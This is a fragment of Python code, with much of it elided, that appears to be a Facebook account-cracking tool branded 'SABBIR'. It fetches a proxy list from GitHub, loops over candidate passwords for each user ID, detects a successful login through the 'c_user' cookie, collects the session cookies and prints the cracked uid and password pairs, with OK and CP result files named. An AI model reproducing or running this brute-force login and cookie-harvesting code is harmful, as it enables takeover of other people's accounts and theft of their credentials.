...
def __init__(self):
        ...
        self.loop = 0
try:
 prox= requests.get('https://github.com/Rdx337/Sabbiropi/blob/main/Ap.txt').text
...
def sexy():
    ...
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(' [😁] OK SABBIR-OK.txt')
    print(' [😁] CP SABBIR-OK.txt')
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
def alh4aj(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;32m[MD-SABBIR-Bhai]\033[1;36m😍[%s/%s]😁\033[1;32m[OK-%s]\033[1;35m \r'%(loop,tl,len(oks))),
            sys.stdout.flush()
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;33m[\033[1;32mSABBIR-BHAI-CP\033[1;33m]\033[1;91m {uid}|{ps}")
